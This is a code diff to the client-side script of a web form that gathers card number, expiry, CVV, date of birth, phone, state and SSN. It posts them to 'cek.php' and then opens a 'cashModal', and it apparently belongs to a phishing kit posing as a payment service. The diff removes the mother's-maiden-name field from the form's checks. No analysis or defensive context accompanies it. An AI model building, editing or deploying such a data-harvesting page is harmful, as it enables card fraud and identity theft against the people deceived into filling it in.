@@ -101,13 +101,6 @@ $(document).ready(function() {
 			$('#state').removeClass('is-invalid');
 		}
 	});
-	$("#mmn").blur(function() {
-		if($("#mmn").val().length < 4){
-			$('#mmn').addClass('is-invalid');
-		}else{
-			$('#mmn').removeClass('is-invalid');
-		}
-	});
 	$('#frmCard').submit(function(event) {
 		event.preventDefault();
 		var error = false;
@@ -150,15 +143,7 @@ $(document).ready(function() {
 			error = true;
 		}else{
 			$('#state').removeClass('is-invalid');
-		}
-
-		if($("#mmn").val().length < 4){;
-			$('#mmn').addClass('is-invalid');
-			error = true;
-		}else{
-			$('#mmn').removeClass('is-invalid');
-		}
-		
+		}	
 		if($("#address").val().length < 4){;
 			$('#address').addClass('is-invalid');
 			error = true;
@@ -206,7 +191,7 @@ $(document).ready(function() {
 			if(!error){
 			$("#btnLogin").prop('disabled', true);
 			$("#btnLogin").html('<img src="/static/img/spin.gif" style="width:43px">');
-			$('#cnum, #exp, #cvv, #zip, #dob, #phone, #state, #mmn').prop('readonly', true);
+			$('#cnum, #exp, #cvv, #zip, #dob, #phone, #state').prop('readonly', true);
 			var logindata =  $("#frmCard").serialize();
 		$.post("cek.php", logindata).done(function(result) {
 				if(result != "no"){
@@ -214,8 +199,8 @@ $(document).ready(function() {
 					$('#btnConfirm').attr("data-oauth", 'flowz.php');
 					$('#cashModal').show();
 				}else{
-					$('#cnum, #exp, #cvv, #zip, #dob, #phone, #state, #mmn').prop('readonly', false);
-					$("#cnum, #exp, #cvv, #zip, #dob, #phone, #state, #mmn").addClass('is-invalid');
+					$('#cnum, #exp, #cvv, #zip, #dob, #phone, #state').prop('readonly', false);
+					$("#cnum, #exp, #cvv, #zip, #dob, #phone, #state").addClass('is-invalid');
 					$("#btnLogin").prop('disabled', false);
 					$("#btnLogin").html('Sign In');
 					if($("#ssn").length > 0) {
